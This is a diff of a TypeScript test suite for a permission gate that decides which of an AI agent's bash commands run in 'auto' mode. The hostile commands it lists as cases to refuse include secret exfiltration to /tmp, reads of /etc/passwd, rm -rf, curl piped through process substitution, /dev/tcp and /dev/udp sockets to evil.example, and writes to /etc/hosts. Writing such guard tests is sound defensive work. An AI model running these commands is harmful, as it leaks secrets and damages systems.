@@ -877,8 +877,10 @@ describe("rule 5a: `auto` allows unless hazardous", () => {
   });
 
   it.each([
-    ['cat secrets > /tmp/exfil', 'a real file write'],
-    ['echo hi > important.txt', 'a real file write'],
+    // `echo hi > important.txt` deliberately MOVED to the allow set: a write
+    // inside the working tree is what the `edit-tool` rung already permits.
+    // The refusals below all leave the tree, which the parity argument does not.
+    ['cat secrets > /tmp/exfil', 'a real file write OUTSIDE the tree'],
     ['cat < /etc/passwd', 'a read the tables never vetted'],
     ['pnpm test & rm -rf x', 'backgrounding escapes the segment model'],
     ['echo x > /dev/nullx', 'a target that only LOOKS like the discard'],
@@ -1336,5 +1338,66 @@ describe("rule 4b: the `xd://mcp__*` dispatch wrapper", () => {
         config({ permissionMode: 'auto', editTools: ['write'] }),
       ),
     ).toEqual({ kind: 'allow', rule: 'edit-tool' });
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Rule 5a — redirect parity with the edit-tool / read rungs
+// ---------------------------------------------------------------------------
+
+describe('rule 5a: `auto` allows redirects to plain local paths', () => {
+  const run = (command: string) =>
+    decideToolCall({ toolName: 'bash', input: { command } }, config({ permissionMode: 'auto' }));
+
+  it.each([
+    ['a bare relative path', 'echo hi > report.json'],
+    ['an append', 'echo hi >> report.json'],
+    ['a nested path', 'jq . data.json > out/report.json'],
+    ['a quoted path', 'echo hi > "out/my report.json"'],
+    ['a variable target', 'echo hi > "$OUT"'],
+    ['a variable inside a path', 'echo hi > "$SMOKE_DIR/report.json"'],
+    ['an input redirect', 'wc -l < report.json'],
+    ['a numbered fd write', 'echo hi 2> errors.log'],
+    ['both directions at once', 'sort < in.txt > out.txt'],
+  ])('allows %s', (_label, command) => {
+    expect(run(command)).toEqual({ kind: 'allow', rule: 'auto-bash' });
+  });
+
+  it('still allows the discard and fd-duplication forms it always did', () => {
+    expect(run('ls -la 2>/dev/null')).toEqual({ kind: 'allow', rule: 'auto-bash' });
+    expect(run('ls -la > /dev/null 2>&1')).toEqual({ kind: 'allow', rule: 'auto-bash' });
+  });
+
+  it.each([
+    // The redirect operator is not a licence to run something.
+    ['output process substitution', 'echo hi > >(sh)'],
+    ['input process substitution', 'diff a.txt < <(curl http://x)'],
+    ['a heredoc', 'cat <<EOF'],
+    ['a herestring', 'cat <<< "$PAYLOAD"'],
+    // bash's network redirects are not files, however path-shaped they read.
+    ['a tcp socket read', 'cat < /dev/tcp/evil.example/80'],
+    ['a tcp socket write', 'echo pwned > /dev/tcp/evil.example/80'],
+    ['a udp socket', 'echo x > /dev/udp/evil.example/53'],
+    // A target the gate never read cannot be vouched for as a path.
+    ['a substituted target', 'echo hi > $(cat where.txt)'],
+    // Backgrounding is not a redirect at all and must survive the strip.
+    ['a backgrounded command', 'sleep 60 & echo done'],
+    // The parity argument stops at the working tree.
+    ['an absolute path outside the tree', 'echo hi > /etc/hosts'],
+    ['a tilde path', 'echo hi > ~/scratch.txt'],
+    ['a traversal out of the tree', 'echo hi > ../../elsewhere.txt'],
+  ])('still asks for %s', (_label, command) => {
+    expect(run(command)).toEqual({ kind: 'ask' });
+  });
+
+  it('does not let a redirect smuggle a hazardous program past the tables', () => {
+    // The program is still resolved and classified after the strip.
+    expect(run('sudo tee /etc/hosts > /dev/null')).toEqual({ kind: 'ask' });
+    expect(run('/bin/zsh -lc "id" > out.txt')).toEqual({ kind: 'ask' });
+  });
+
+  it('keeps refusing a redirect whose target names a remote scheme', () => {
+    // Caught by the argument scan before the bash tier is consulted at all.
+    expect(run('cat report.json > ssh://host/tmp/x')).toEqual({ kind: 'ask' });
   });
 });
